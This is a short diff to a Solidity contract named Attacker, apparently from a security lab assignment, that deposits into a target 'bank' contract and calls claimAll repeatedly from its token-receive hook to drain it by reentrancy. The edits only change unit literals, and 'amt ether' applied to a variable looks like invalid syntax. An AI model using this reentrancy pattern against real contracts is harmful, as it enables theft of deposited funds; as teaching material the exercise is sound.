@@ -38,7 +38,7 @@ contract Attacker is AccessControl, IERC777Recipient {
       		require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
 			require(amt>0, "Amount must be greater than zero");
-			bank.deposit{value: amt}();
+			bank.deposit{value: amt ether}();
 			bank.claimAll();
 	}
 
@@ -68,7 +68,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 			//for (uint i = 0; i < 10; i++){
 				//bank.claimAll();
 			//}
-			if (address(this).balance > 0 ) {
+			if (address(this).balance > 0 ether) {
            			bank.claimAll();
 				
        }
